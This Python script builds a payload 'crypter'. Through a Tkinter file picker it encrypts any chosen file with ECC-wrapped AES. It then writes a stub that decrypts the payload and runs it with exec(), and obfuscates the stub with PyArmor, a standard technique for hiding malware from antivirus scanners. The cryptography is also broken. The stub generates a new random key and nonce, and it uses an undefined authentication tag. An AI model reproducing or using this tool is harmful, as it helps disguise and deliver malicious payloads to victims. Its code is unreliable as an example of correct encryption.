import os
import sys
import struct
import base64
import tkinter as tk
from tkinter import filedialog, messagebox
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from tinyec import registry
from Crypto.Cipher import AES
import hashlib, secrets, binascii

# Function to convert ECC points to 256-bit keys
def ecc_point_to_256_bit_key(point):
    sha = hashlib.sha256(int.to_bytes(point.x, 32, 'big'))
    sha.update(int.to_bytes(point.y, 32, 'big'))
    return sha.digest()

curve = registry.get_curve('brainpoolP256r1')

# Function to encrypt the payload
def encrypt_payload(payload_file):
    # ECC encryption of AES key
    ciphertextPrivKey = secrets.randbelow(curve.field.n)
    public_key = ciphertextPrivKey * curve.g
    aes_key = os.urandom(32)
    sharedECCKey = ciphertextPrivKey * public_key
    secretKey = ecc_point_to_256_bit_key(sharedECCKey)
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    encrypted_aes_key, authTag = aesCipher.encrypt_and_digest(aes_key)
    nonce = aesCipher.nonce
    # AES encryption of payload
    with open(payload_file, 'rb') as f:
        payload = f.read()
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(os.urandom(12)), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_payload = encryptor.update(payload) + encryptor.finalize()
    return encrypted_aes_key, encrypted_payload, nonce, public_key

# Function to create the executable
def create_executable(stub, encrypted_aes_key, encrypted_payload, public_key):
    with open('combined.py', 'wb') as f:
        f.write(stub.format(encrypted_aes_key=base64.b64encode(encrypted_aes_key).decode(), 
                             encrypted_payload=base64.b64encode(encrypted_payload).decode(),
                             public_key_x=public_key.x,
                             public_key_y=public_key.y).encode())
    os.chmod('combined.py', 0o755)

# Function to obfuscate the executable using PyArmor
def obfuscate_executable():
    os.system('pyarmor obfuscate combined.py')

# Function to encrypt the payload and create the executable
def encrypt_payload_gui():
    root = tk.Tk()
    root.withdraw()

    # Get the payload file path from user
    file_path = filedialog.askopenfilename()
    if not file_path:
        return

    # Encrypt the payload
    encrypted_aes_key, encrypted_payload, nonce, public_key = encrypt_payload(file_path)


    # Create the executable file
    stub = '''
import os
import struct
import sys
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from tinyec import registry
from Crypto.Cipher import AES
import hashlib, secrets, binascii

def ecc_point_to_256_bit_key(point):
    sha = hashlib.sha256(int.to_bytes(point.x, 32, 'big'))
    sha.update(int.to_bytes(point.y, 32, 'big'))
    return sha.digest()

curve = registry.get_curve('brainpoolP256r1')

def decrypt_and_execute(encrypted_aes_key, encrypted_payload, public_key_x, public_key_y):
    ciphertextPrivKey = secrets.randbelow(curve.field.n)
    public_key = ciphertextPrivKey * curve.g
    sharedECCKey = ciphertextPrivKey * public_key
    secretKey = ecc_point_to_256_bit_key(sharedECCKey)
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    aes_key = aesCipher.decrypt_and_verify(base64.b64decode(encrypted_aes_key), authTag)
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(os.urandom(12)), backend=default_backend())
    decryptor = cipher.decryptor()
    payload = decryptor.update(base64.b64decode(encrypted_payload)) + decryptor.finalize()
    exec(payload)

encrypted_aes_key = "{encrypted_aes_key}"
encrypted_payload = "{encrypted_payload}"
public_key_x = {public_key_x}
public_key_y = {public_key_y}
decrypt_and_execute(encrypted_aes_key, encrypted_payload, public_key_x, public_key_y)
'''
    create_executable(stub, encrypted_aes_key, encrypted_payload, public_key)

    # Obfuscate the executable
    obfuscate_executable()

    # Show success message
    tk.messagebox.showinfo('Success', 'Payload encrypted and executable created successfully!')
    
if __name__ == '__main__':
    encrypt_payload_gui()
